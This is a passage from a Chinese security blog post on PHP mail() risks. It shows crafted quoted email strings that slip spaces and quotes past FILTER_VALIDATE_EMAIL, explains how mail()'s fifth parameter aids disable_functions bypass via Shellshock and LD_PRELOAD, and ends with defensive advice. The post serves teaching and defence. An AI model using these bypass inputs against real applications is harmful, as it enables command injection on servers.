title="不安全的FILTER_VALIDATE_EMAIL"></a>不安全的FILTER_VALIDATE_EMAIL</h3><p>有些程序员会将第五个参数additional_parameters通过调用FILTER_VALIDATE_EMAIL过滤器来进行email地址的校验，但是仅仅靠FILTER_VALIDATE_EMAIL来实现防御还是存在安全问题的。</p><p>下面先看下几个基本概念。</p><h4 id="filter-var-函数"><a href="#filter-var-函数" class="headerlink" title="filter_var()函数"></a>filter_var()函数</h4><p>(PHP 5 &gt;= 5.2.0, PHP 7)</p><p>filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">variable</td><td style="text-align:left">必需。规定要过滤的变量。</td></tr><tr><td style="text-align:left">filter</td><td style="text-align:left">可选。规定要使用的过滤器的 ID。默认是 FILTER_SANITIZE_STRING。参见 <a href="https://www.runoob.com/php/php-ref-filter.html" target="_blank" rel="noopener">完整的 PHP Filter 参考手册</a>，查看可能的过滤器。过滤器 ID 可以是 ID 名称（比如 FILTER_VALIDATE_EMAIL）或 ID 号（比如 274）。</td></tr><tr><td style="text-align:left">options</td><td style="text-align:left">可选。规定一个包含标志/选项的关联数组或者一个单一的标志/选项。检查每个过滤器可能的标志和选项。</td></tr></tbody></table><p>可以看到，该函数第二个参数是可以设置指定过滤器的，其中对于email地址的过滤可以设置FILTER_VALIDATE_EMAIL过滤器。</p><h4 id="FILTER-VALIDATE-EMAIL过滤器"><a href="#FILTER-VALIDATE-EMAIL过滤器" class="headerlink" title="FILTER_VALIDATE_EMAIL过滤器"></a>FILTER_VALIDATE_EMAIL过滤器</h4><p>FILTER_VALIDATE_EMAIL过滤器把值作为email地址来验证。</p><p>示例Demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$email = <span class="string">"someone@exa mple.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!filter_var($email, FILTER_VALIDATE_EMAIL))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"E-mail is not valid"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"E-mail is valid"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="安全缺陷"><a href="#安全缺陷" class="headerlink" title="安全缺陷"></a>安全缺陷</h4><blockquote><p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly" target="_blank" rel="noopener">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们能够在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，我们就可以绕过检测。</p></blockquote><p>我们写个简单的例子就知道：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(filter_var(<span class="string">'\'is."\'\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line">var_dump(filter_var(<span class="string">'"is.\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line">var_dump(filter_var(<span class="string">'"is.""\ not\ allowed"@example.com'</span>, FILTER_VALIDATE_EMAIL));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/07/16/PHP中mail-函数安全问题与防御/4.png" alt=""></p><p>可以看到，这样就能逃逸出FILTER_VALIDATE_EMAIL来输入单引号和空格等字符了，进而可以结合其他漏洞打出组合拳进行高阶利用。</p><h3 id="助攻disable-functions绕过"><a href="#助攻disable-functions绕过" class="headerlink" title="助攻disable_functions绕过"></a>助攻disable_functions绕过</h3><h4 id="Bash破壳漏洞"><a href="#Bash破壳漏洞" class="headerlink" title="Bash破壳漏洞"></a>Bash破壳漏洞</h4><p>具体原理和示例可看：<a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></p><p>这里简单说下mail()函数为啥进行了助攻：因为mail()函数的第五个参数additional_parameters在mail.c的源码中会直接拼接成一条新的命令然后传入popen()中执行，当目标系统存在Bash破壳漏洞时，攻击者就可以借助mail()函数来注入第五个参数从而实现disable_functions的绕过。</p><h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><p>具体原理和示例可看：<a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></p><p>这里简单说下mail()函数为啥进行了助攻：我们知道这种方法绕过disable_functions主要是通过劫持某个函数如getuid()或劫持启动进程来实现的，而调用mail()函数会启动进程或调用系统sendmail程序，进而调用getuid()函数从而实现劫持，最终导致disable_functions被绕过。</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>当然，以上列的只是常见的遇到，外国佬研究的比较深，有多个新的攻击利用向量可以借鉴，具体的看文章就好：</p><p>原文：<a href="https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html" target="_blank" rel="noopener">Pwning PHP mail() function For Fun And RCE</a></p><p>翻译版：<a href="https://www.anquanke.com/post/id/86028" target="_blank" rel="noopener">详细解析PHP mail()函数漏洞利用技巧</a></p><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>对于直接的mail()函数的问题，主要针对几个参数进行防御：</p><ul><li>to参数：除非特定场景，一般不让用户从外部输入；</li><li>subject参数：安全使用；</li><li>message参数：安全使用；</li><li>headers参数：若用户可从外部输入，则过滤\r和\n字符，防御CRLF注入；</li><li>parameters参数：尽量不使用用户输入，实在不行要按照业务场景进行严格过滤；</li></ul><p>对于由mail()间接助攻引起的一系列问题，需按业务场景来规划：</p><ul><li>如果非必需，直接disable_functions禁用掉；</li><li>如果业务需要，不用或严格过滤第五个参数，起到点缓解的作用；</li></ul><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://blog.ripstech.com/2017/why-mail-is-dangerous-in-php/" target="_blank" rel="noopener">Why mail() is dangerous in PHP</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
</feed>
